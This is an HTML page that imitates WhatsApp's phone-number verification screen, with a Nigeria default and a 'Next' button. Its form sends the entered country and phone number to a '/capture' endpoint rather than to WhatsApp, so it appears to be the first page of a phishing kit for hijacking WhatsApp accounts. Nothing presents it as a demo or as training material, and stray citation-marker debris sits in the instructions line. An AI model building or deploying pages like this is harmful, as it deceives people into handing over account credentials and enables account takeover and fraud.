<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification - Step 1</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>

    <form action="/capture" method="POST" class="form-wrapper" id="step1Form">
        <div class="wrapper">
            <div class="step-view active">
                <div class="header-top">
                    <span class="close-icon">&times;</span>
                    <span class="menu-icon">&#8942;</span>
                </div>
                <h2>Enter your phone number</h2>
                <div class="instructions">
                    WhatsApp will verify your account. <a href="#" class="help-link">What's my phone number?</a>[span_2](start_span)[span_2](end_span)
                </div>

                <div class="input-group-container">
                    <!-- Country Selector -->
                    <div class="select-wrapper">
                        <select id="countrySelect" name="country_name">
                            <option value="Nigeria" selected>Nigeria</option>
                            <option value="United States">United States</option>
                            <option value="United Kingdom">United Kingdom</option>
                            <option value="India">India</option>
                        </select>
                    </div>

                    <!-- Phone Input Row -->
                    <div class="phone-row">
                        <input type="text" id="countryCodeInput" name="cc" class="cc-input" value="+ 234" readonly>
                        <div class="phone-input-wrapper" style="flex-grow: 1;">
                            <input type="tel" id="phoneNumberInput" name="phone" placeholder="Phone number" autocomplete="tel-national" required autofocus>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Persistent Bottom Action Button -->
        <div class="action-container">
            <button type="submit" class="btn-next" id="nextBtn" disabled>Next</button>
        </div>
    </form>

    <script src="static/script.js"></script>
</body>
</html>
